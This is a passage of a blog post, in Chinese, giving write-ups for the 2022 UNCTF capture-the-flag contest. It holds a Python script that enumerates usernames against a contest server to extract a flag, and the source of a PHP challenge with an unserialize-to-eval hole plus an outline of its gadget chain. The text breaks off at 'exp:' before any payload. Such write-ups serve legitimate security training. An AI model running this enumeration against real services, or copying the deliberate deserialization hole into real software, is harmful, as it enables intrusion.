

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/snow.png">
  <link rel="icon" href="/img/snow.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Aru3h@rk">
  <meta name="keywords" content="">
  
    <meta name="description" content="2022 UNCTF部分WP 队名：╰(￣ω￣ｏ)     分数 	2644  排名 	16&#x2F;830  WEB签到-吉林警察学院 源码给了个账号密码，  不是sql注入。发现输入20200102时，回显了一个f  跑一下 1234567891011121314151617181920212223242526272829# coding&#x3D;utf-8&#x2F;gbkfrom urllib impor">
<meta property="og:type" content="article">
<meta property="og:title" content="2022_UNCTF">
<meta property="og:url" content="https://emoment.top/2023/01/10/2022-UNCTF/index.html">
<meta property="og:site_name" content="Aru3h@rk&#39;s Blog">
<meta property="og:description" content="2022 UNCTF部分WP 队名：╰(￣ω￣ｏ)     分数 	2644  排名 	16&#x2F;830  WEB签到-吉林警察学院 源码给了个账号密码，  不是sql注入。发现输入20200102时，回显了一个f  跑一下 1234567891011121314151617181920212223242526272829# coding&#x3D;utf-8&#x2F;gbkfrom urllib impor">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744843.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744844.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744845.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744846.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744847.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744848.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744850.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744851.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744852.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744853.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744854.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744855.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744856.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744857.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744858.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744859.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744860.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744861.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744862.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744863.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744864.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744865.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744866.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744867.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744868.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744869.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744870.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744871.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744872.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744873.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744874.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744875.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744876.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744877.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744878.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744879.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744880.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744881.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744882.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744883.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744884.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744885.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744886.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744887.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744888.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744889.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744890.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744891.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744892.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744893.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744894.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744895.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744896.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744897.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744898.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744899.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744900.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744901.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744902.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744903.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744904.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744905.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744906.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744907.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744908.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744909.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744910.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744911.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744912.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744913.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744914.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744915.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744916.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744917.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744918.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744919.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744920.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744921.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744922.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744923.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744925.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744926.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744927.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744928.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744929.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744930.png">
<meta property="article:published_time" content="2023-01-10T05:55:36.000Z">
<meta property="article:modified_time" content="2023-01-10T12:00:20.094Z">
<meta property="article:author" content="Aru3h@rk">
<meta property="article:tag" content="web">
<meta property="article:tag" content="2022">
<meta property="article:tag" content="UNCTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744843.png">
  
  
  
  <title>2022_UNCTF - Aru3h@rk&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/diy/mouse.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"emoment.top","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"PERL"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cdfeKiXXYt5oy5kPKok1NpMX-MdYXbMMI","app_key":"nZb1Gg3blWe7z5TnY61MHQFC","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Aru3h@rk</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/B1.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2022_UNCTF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-01-10 13:55" pubdate>
          2023年1月10日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          37k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          154 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">2022_UNCTF</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2023年1月10日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="2022-UNCTF部分WP"><a href="#2022-UNCTF部分WP" class="headerlink" title="2022 UNCTF部分WP"></a>2022 UNCTF部分WP</h1><blockquote>
<p>队名：╰(￣ω￣ｏ)    </p>
<p>分数 	2644 </p>
<p>排名 	16&#x2F;830</p>
</blockquote>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到-吉林警察学院"><a href="#签到-吉林警察学院" class="headerlink" title="签到-吉林警察学院"></a>签到-吉林警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744843.png" srcset="/img/loading.gif" lazyload alt="image-20221118210612900"></p>
<p>源码给了个账号密码，</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744844.png" srcset="/img/loading.gif" lazyload alt="image-20221112133913174"></p>
<p>不是sql注入。发现输入20200102时，回显了一个f</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744845.png" srcset="/img/loading.gif" lazyload alt="image-20221112133958673"></p>
<p>跑一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8/gbk</span><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn:80/index.php&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn/index.php&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">50</span>):<br>	<span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">10</span>:<br>		username=<span class="hljs-string">&quot;2020010%d&quot;</span>%i<br>	<span class="hljs-keyword">else</span>:<br>		username = <span class="hljs-string">&quot;202001%d&quot;</span> % i<br>	burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:username, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;20200101&quot;</span>, <span class="hljs-string">&quot;submit&quot;</span>: <span class="hljs-string">&quot;\xe6\x8f\x90\xe4\xba\xa4\xe6\x9f\xa5\xe8\xaf\xa2&quot;</span>&#125;<br>	re=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)<br>	<span class="hljs-comment"># print(re.text)</span><br>	<span class="hljs-comment"># break</span><br>	<span class="hljs-keyword">if</span> parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">2</span>:] == <span class="hljs-string">&quot;7B&quot;</span>:<br>		flag+=<span class="hljs-string">&quot;&#123;&quot;</span><br>		<span class="hljs-keyword">continue</span><br>	<span class="hljs-keyword">if</span> parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">2</span>:] == <span class="hljs-string">&quot;7D&quot;</span>:<br>		flag+=<span class="hljs-string">&quot;&#125;&quot;</span><br>		<span class="hljs-keyword">break</span><br>	flag+=parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">1</span>]<br>	time.sleep(<span class="hljs-number">0.5</span>)<br>	<span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="ezunseri-西华大学"><a href="#ezunseri-西华大学" class="headerlink" title="ezunseri-西华大学"></a>ezunseri-西华大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744846.png" srcset="/img/loading.gif" lazyload alt="image-20221119102049019"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;content);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br>       <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;content);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;1!5!&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-string">&quot;test123&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;test;<br>        <span class="hljs-variable">$name</span>();<br>    &#125;<br><br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Login</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot; JUST FOR FUN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;UNCTF&quot;</span></span>)</span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-variable language_">$this</span>-&gt;code;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&#x27;3.1415926&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;key-&gt;name;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[pop]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <br>   <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Login</span>();<br>   <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>&#125; <br></code></pre></td></tr></table></figure>

<p>链子:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">Login::<span class="hljs-title function_ invoke__">s__destruct</span>()--<span class="hljs-punctuation">-&gt;</span>Exec::__get()--<span class="hljs-punctuation">-&gt;</span>Test::__toString()--<span class="hljs-punctuation">-&gt;</span>Exec::<span class="hljs-title function_ invoke__">invoke</span>()--<span class="hljs-punctuation">-&gt;</span>Exec::<span class="hljs-title function_ invoke__">execute</span>()<br></code></pre></td></tr></table></figure>

<p>exp:</p>
